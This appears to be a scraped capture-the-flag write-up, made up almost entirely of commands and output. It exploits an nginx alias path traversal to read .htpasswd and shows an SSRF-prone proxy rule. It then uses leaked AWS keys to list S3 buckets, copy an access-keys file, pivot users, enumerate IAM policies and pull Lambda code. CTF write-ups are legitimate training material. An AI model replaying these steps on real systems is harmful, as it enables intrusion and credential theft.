# Security-JAWS DAYS CTF Writeups

> 原文: https://www.ctfiot.com/132405.html
> ID: 132405


```
location /assets {
 alias /usr/share/static/;
 }
GET /assets../secret/.htpasswd HTTP/1.1
Host: apjweb.scjdaysctf2023.net
Connection: close
location ~^/admin/proxy/(?.*?)/(?.*)$ {
 proxy_pass http://$proxy_host/$proxy_path;
 proxy_set_header Host $proxy_host;
 }
"AccessKeyId" : "[REDACTED]",
 "SecretAccessKey" : "[REDACTED]",
 "Token" : "[REDACTED]",
[ctf-hard-aws-pentesting-journey]
aws_access_key_id = [REDACTED]
aws_secret_access_key = [REDACTED]
aws_session_token = [REDACTED]
$ aws s3 ls --profile ctf-hard-aws-pentesting-journey
2023-08-13 23:13:07 backup-37szjp8pny7xx01
2023-08-26 22:43:13 camouflagedrop-wxhqft4lqf-assets-wxhqft4lqf-assets
2023-08-26 22:39:22 camouflagedrop-wxhqft4lqf-web-wxhqft4lqf-static
2023-08-22 20:16:14 cdk-hnb659fds-assets-055450064556-ap-northeast-1
2023-08-25 03:05:46 file-storage-afeffefespntbaiw7o5
2023-08-06 21:55:59 himituno-bucket1
2023-08-06 21:58:33 himituno-bucket2
2023-08-06 23:08:46 himituno-bucket3
2023-08-27 02:41:30 my-backup-file-ulxmhiw3jroec7sclynr06fkvhqssf
2023-08-22 20:56:47 s3misssignurl-t6j4qj4r-assets-t6j4qj4r-assets-bucket
2023-08-22 20:52:31 s3misssignurl-t6j4qj4r-web-t6j4qj4r-static-host-bucket
2023-08-24 04:24:09 totemo-kawaii-neko-no-namae-ha-lise-desu
2023-08-27 01:18:59 ulxmhiw3jroec7sclynr06fkvhqssf

$ aws s3 ls s3://backup-37szjp8pny7xx01 --profile ctf-hard-aws-pentesting-journey
 PRE dbbackup/
2023-08-14 03:02:43 99 dboperator_accessKeys.csv

$ aws s3 cp s3://backup-37szjp8pny7xx01 . --profile ctf-hard-aws-pentesting-journey --recursive
$ aws configure --profile ctf-hard-aws-pentesting-journey-dboperator
AWS Access Key ID [None]: [REDACTED]
AWS Secret Access Key [None]: [REDACTED]
Default region name [None]: ap-northeast-1
Default output format [None]:

$ aws sts get-caller-identity --profile ctf-hard-aws-pentesting-journey-dboperator
{
 "UserId": "[REDACTED]",
 "Account": "[REDACTED]",
 "Arn": "arn:
aws:
iam::
055450064556:
user/dboperator"
}

$ aws iam list-attached-user-policies --user-name dboperator --profile ctf-hard-aws-pentesting-journey-dboperator
{
 "AttachedPolicies": [
 {
 "PolicyName": "dboperator",
 "PolicyArn": "arn:
aws:
iam::
055450064556:
policy/dboperator"
 }
 ]
}

$ aws iam get-policy --policy-arn arn:
aws:
iam::
055450064556:
policy/dboperator --profile ctf-hard-aws-pentesting-journey-dboperator
{
 "Policy": {
 "PolicyName": "dboperator",
 "PolicyId": "[REDACTED]",
 "Arn": "arn:
aws:
iam::
055450064556:
policy/dboperator",
 "Path": "/",
 "DefaultVersionId": "v6",
 "AttachmentCount": 1,
 "PermissionsBoundaryUsageCount": 0,
 "IsAttachable": true,
 "CreateDate": "2023-08-13T18:18:19+00:00",
 "UpdateDate": "2023-08-13T18:57:09+00:00",
 "Tags": []
 }
}

$ aws iam get-policy-version --version-id v6 --policy-arn arn:
aws:
iam::
055450064556:
policy/dboperator --profile ctf-hard-aws-pentesting-journey-dboperator
{
 "PolicyVersion": {
 "Document": {
 "Version": "2012-10-17",
 "Statement": [
 {
 "Effect": "Allow",
 "Action": [
 "lambda:
List*",
 "lambda:
GetFunction",
 "lambda:
InvokeFunction"
 ],
 "Resource": "arn:
aws:
lambda:ap-northeast-1:
055450064556:
function:db-buckup*"
 },
 {
 "Effect": "Allow",
 "Action": [
 "iam:
Get*",
 "iam:
List*"
 ],
 "Resource": [
 "arn:
aws:
iam::
055450064556:
policy/dboperator",
 "arn:
aws:
iam::
055450064556:
user/dboperator"
 ]
 }
 ]
 },
 "VersionId": "v6",
 "IsDefaultVersion": true,
 "CreateDate": "2023-08-13T18:57:09+00:00"
 }
}

$ aws lambda get-function --function-name 'arn:
aws:
lambda:ap-northeast-1:
055450064556:
function:db-buckup' --profile ctf-hard-aws-pentesting-journey-dboperator

"Location": "[REDACTED]"
$ aws lambda list-versions-by-function --function-name 'db-buckup' --profile ctf-hard-aws-pentesting-journey-dboperator

"Version": "1",
"Version": "2",

$ aws lambda get-function --function-name 'arn:
aws:
lambda:ap-northeast-1:
055450064556:
function:db-buckup' --profile ctf-hard-aws-pentesting-journey-dboperator --qualifier 1
...
"Location": "[REDACTED]"
```
